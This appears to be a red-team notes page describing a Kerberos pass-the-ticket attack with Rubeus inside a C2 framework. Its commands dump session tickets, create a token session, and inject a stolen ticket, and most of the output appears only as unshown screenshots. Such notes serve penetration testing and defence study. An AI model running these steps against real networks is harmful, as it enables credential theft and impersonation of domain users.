# Rubeus

## Rubeus

### Pass the Ticket

#### - Show all session tickets

```
Rubeus triage
```

![](<../../../../.gitbook/assets/image (3) (1).png>)

#### - Dump the tickets

```
Rubeus dump
```

![](<../../../../.gitbook/assets/image (103).png>)

#### Loot are available in Data pane:

![](<../../../../.gitbook/assets/image (275).png>)

#### Copy the base64 ticket (bug from data interface, copy the interactive window)

![](<../../../../.gitbook/assets/image (311).png>)

#### Create a new session using MakeToken

```
MakeToken help

[!] Usage: MakeToken <username> <domain> <password>[ <logontype> ]
```

![](<../../../../.gitbook/assets/image (272).png>)

#### Create a new grunt session&#x20;

```
CreateProcessWithToken

[!] Usage: CreateProcessWithToken <command>[ <path> ]
```

![](<../../../../.gitbook/assets/image (101).png>)

#### Pass the ticket

```
rubeus ptt /ticket:
```

![](<../../../../.gitbook/assets/image (260).png>)

![](<../../../../.gitbook/assets/image (14).png>)

#### cifs ticket injected&#x20;

![](<../../../../.gitbook/assets/image (126).png>)

###
